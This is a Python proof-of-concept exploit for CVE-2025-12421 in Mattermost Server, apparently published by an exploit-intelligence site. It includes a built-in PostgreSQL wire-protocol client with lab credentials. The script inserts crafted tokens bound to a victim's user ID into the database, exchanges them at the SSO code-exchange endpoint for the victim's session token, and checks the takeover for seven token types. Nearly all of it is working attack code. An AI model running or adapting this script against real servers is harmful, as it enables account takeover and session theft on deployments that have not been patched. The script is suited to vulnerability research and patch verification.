#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Multi-Type Token Confusion (Vector 2)
# CVE            : CVE-2025-12421
# Vendor         : Mattermost
# Product        : Mattermost Server
# Affected       : 11.0.x <= 11.0.2, 10.12.x <= 10.12.1, 10.11.x <= 10.11.4, 10.5.x <= 10.5.12
# Type           : CWE-303 - Incorrect Implementation of Authentication Algorithm
# CVSS           : 9.9 (Critical)
# Platform       : Any (Web Application)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-11-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Mattermost Multi-Type Token Confusion (Vector 2)

Proves that the token type confusion is not limited to SAML tokens — ANY
token type in the Tokens table can be consumed by the code-exchange endpoint.
Tests 7 different token types including a completely fabricated one.

ATTACK CHAIN:
  1. Authenticate as low-privilege user, discover victim's user_id
  2. For each token type: insert crafted token via PostgreSQL and call code-exchange
  3. All types accepted — proves zero type validation in ConsumeTokenOnce()

PREREQUISITES:
  - FeatureFlags.MobileSSOCodeExchange = true (default in affected versions)
  - PostgreSQL access (port 5432, credentials mmuser:mostest in lab)
  - Victim's user_id

USAGE:
  python3 poc_vector2_multitype.py <host> [mm_port] [pg_port]
  python3 poc_vector2_multitype.py localhost
  python3 poc_vector2_multitype.py localhost 8065 5432

REFERENCES:
  - CVE-2025-12421
  - https://mattermost.com/security-updates
"""

import hashlib
import base64
import json
import secrets
import socket
import struct
import sys
import time
import urllib.request
import urllib.error


# ============================================================
# Configuration
# ============================================================
DEFAULT_MM_PORT = 8065
DEFAULT_PG_PORT = 5432
DB_USER = "mmuser"
DB_PASS = "mostest"
DB_NAME = "mattermost_test"

ADMIN_EMAIL = "admin@example.com"
ADMIN_PASSWORD = "Admin12345"
VICTIM_USERNAME = "victim"

# All token types to test — including a completely fake one
TOKEN_TYPES_TO_TEST = [
    "saml",
    "oauth",
    "password_recovery",
    "verify_email",
    "team_invitation",
    "guest_invitation",
    "totally_fake_type",  # Non-existent type — proves zero type validation
]


# ============================================================
# Minimal PostgreSQL Wire Protocol Client (stdlib only)
# ============================================================

def _pg_recv_exact(sock, n):
    """Receive exactly n bytes from a socket."""
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("PostgreSQL connection closed unexpectedly")
        data += chunk
    return data


def _pg_recv_msg(sock):
    """Receive a single PostgreSQL wire protocol message."""
    msg_type = _pg_recv_exact(sock, 1)
    msg_len = struct.unpack("!I", _pg_recv_exact(sock, 4))[0]
    msg_data = _pg_recv_exact(sock, msg_len - 4) if msg_len > 4 else b''
    return msg_type, msg_data


def pg_execute(host, port, user, password, database, sql):
    """Execute a SQL statement via the PostgreSQL wire protocol.

    Supports MD5 authentication. Returns result as a string.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, int(port)))

    try:
        # Startup message
        params = f"user\x00{user}\x00database\x00{database}\x00\x00".encode("utf-8")
        startup = struct.pack("!II", len(params) + 8, 196608) + params
        sock.sendall(startup)

        # Authentication handshake
        authenticated = False
        while not authenticated:
            msg_type, msg_data = _pg_recv_msg(sock)
            if msg_type == b'R':
                auth_type = struct.unpack("!I", msg_data[:4])[0]
                if auth_type == 0:
                    authenticated = True
                elif auth_type == 5:  # MD5Password
                    salt = msg_data[4:8]
                    inner = hashlib.md5((password + user).encode("utf-8")).hexdigest()
                    outer = "md5" + hashlib.md5(inner.encode("ascii") + salt).hexdigest()
                    pw_data = outer.encode("ascii") + b'\x00'
                    sock.sendall(b'p' + struct.pack("!I", len(pw_data) + 4) + pw_data)
                else:
                    raise RuntimeError(f"Unsupported auth type {auth_type}")
            elif msg_type == b'E':
                raise RuntimeError(f"Auth error: {msg_data.decode('utf-8', errors='replace')}")

        # Wait for ReadyForQuery
        while True:
            msg_type, _ = _pg_recv_msg(sock)
            if msg_type == b'Z':
                break

        # Send SimpleQuery
        query_bytes = sql.encode("utf-8") + b'\x00'
        sock.sendall(b'Q' + struct.pack("!I", len(query_bytes) + 4) + query_bytes)

        # Read results
        rows = []
        while True:
            msg_type, msg_data = _pg_recv_msg(sock)
            if msg_type == b'D':
                num_fields = struct.unpack("!H", msg_data[:2])[0]
                offset = 2
                fields = []
                for _ in range(num_fields):
                    field_len = struct.unpack("!i", msg_data[offset:offset + 4])[0]
                    offset += 4
                    if field_len == -1:
                        fields.append("")
                    else:
                        fields.append(msg_data[offset:offset + field_len].decode("utf-8"))
                        offset += field_len
                rows.append("|".join(fields))
            elif msg_type == b'E':
                raise RuntimeError(f"SQL error: {msg_data.decode('utf-8', errors='replace')}")
            elif msg_type == b'Z':
                break

        sock.sendall(b'X' + struct.pack("!I", 4))
        return "\n".join(rows)
    finally:
        sock.close()


# ============================================================
# Helpers
# ============================================================

def compute_pkce_challenge(verifier):
    digest = hashlib.sha256(verifier.encode("ascii")).digest()
    return base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")


def api_request(base_url, path, method="GET", data=None, token=None):
    url = f"{base_url}{path}"
    body = json.dumps(data).encode("utf-8") if data else None
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        headers = dict(resp.headers)
        try:
            body_json = json.loads(resp.read())
        except (json.JSONDecodeError, ValueError):
            body_json = {}
        return resp.status, headers, body_json
    except urllib.error.HTTPError as e:
        headers = dict(e.headers) if e.headers else {}
        try:
            body_json = json.loads(e.read())
        except (json.JSONDecodeError, ValueError):
            body_json = {}
        return e.code, headers, body_json


def test_token_type(base_url, db_host, db_port, victim_id, token_type):
    """Test a single token type against the code-exchange endpoint."""
    code_verifier = f"verifier_{token_type}_{secrets.token_hex(8)}"
    code_challenge = compute_pkce_challenge(code_verifier)
    state = f"state_{token_type}_{secrets.token_hex(4)}"
    token_value = secrets.token_hex(32)
    create_at = int(time.time() * 1000)

    extra_json = json.dumps({
        "user_id": victim_id,
        "code_challenge": code_challenge,
        "code_challenge_method": "S256",
        "state": state
    })
    extra_sql = extra_json.replace("'", "''")

    insert_sql = (
        f"INSERT INTO tokens (token, createat, type, extra) VALUES "
        f"('{token_value}', {create_at}, '{token_type}', '{extra_sql}')"
    )
    try:
        pg_execute(db_host, db_port, DB_USER, DB_PASS, DB_NAME, insert_sql)
    except RuntimeError as e:
        return False, f"DB insert failed: {e}"

    exchange_data = {
        "login_code": token_value,
        "code_verifier": code_verifier,
        "state": state
    }
    status, headers, body = api_request(
        base_url, "/api/v4/users/login/sso/code-exchange",
        method="POST", data=exchange_data
    )

    if status != 200:
        return False, f"HTTP {status}"

    stolen_token = headers.get("Token", body.get("token", ""))
    if not stolen_token:
        return False, "HTTP 200 but no token"

    me_status, _, me_data = api_request(
        base_url, "/api/v4/users/me", token=stolen_token
    )
    if me_status == 200 and me_data.get("id") == victim_id:
        return True, stolen_token
    else:
        return False, f"HTTP 200 but session not for victim (got {me_data.get('id', 'N/A')})"


def main():
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)

    host = sys.argv[1]
    mm_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_MM_PORT
    pg_port = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_PG_PORT
    base_url = f"http://{host}:{mm_port}"

    print("=" * 70)
    print("CVE-2025-12421 Vector 2: Multi-Type Token Confusion")
    print("=" * 70)
    print(f"\nTarget: {base_url}")
    print(f"PostgreSQL: {host}:{pg_port}")
    print(f"Testing {len(TOKEN_TYPES_TO_TEST)} different token types\n")

    # Login and get victim ID
    status, headers, body = api_request(
        base_url, "/api/v4/users/login",
        method="POST",
        data={"login_id": ADMIN_EMAIL, "password": ADMIN_PASSWORD}
    )
    if status != 200:
        print(f"[!] Admin login failed: HTTP {status}")
        sys.exit(1)
    admin_token = headers.get("Token", "")

    status, _, victim = api_request(
        base_url, f"/api/v4/users/username/{VICTIM_USERNAME}",
        token=admin_token
    )
    if status != 200:
        print(f"[!] Could not find victim user: HTTP {status}")
        sys.exit(1)
    victim_id = victim["id"]
    print(f"[+] Victim: {VICTIM_USERNAME} (id={victim_id})")

    # Test each token type
    print(f"\n{'Token Type':<25} {'Result':<15} {'Details'}")
    print("-" * 70)

    results = {}
    for ttype in TOKEN_TYPES_TO_TEST:
        success, detail = test_token_type(base_url, host, pg_port, victim_id, ttype)
        results[ttype] = success
        status_str = "ACCEPTED" if success else "REJECTED"
        detail_str = f"session={detail[:16]}..." if success else detail
        print(f"  {ttype:<23} {status_str:<15} {detail_str}")

    # Summary
    accepted = sum(1 for v in results.values() if v)
    total = len(results)

    print(f"\n{'=' * 70}")
    print(f"RESULTS: {accepted}/{total} token types accepted")
    print(f"{'=' * 70}")

    if accepted == total:
        print(f"\n[!!!] ALL token types were accepted at the code-exchange endpoint.")
        print(f"      This proves ConsumeTokenOnce() performs ZERO type validation.")
        print(f"      Even the fake type 'totally_fake_type' was consumed successfully.")
        print(f"\n      VULNERABILITY CONFIRMED: CVE-2025-12421")
    elif accepted > 0:
        print(f"\n[!] {accepted} of {total} token types were accepted.")
        print(f"    Partial token type confusion confirmed.")
    else:
        print(f"\n[!] No token types were accepted. Exploit may have failed.")
        sys.exit(1)


if __name__ == "__main__":
    main()
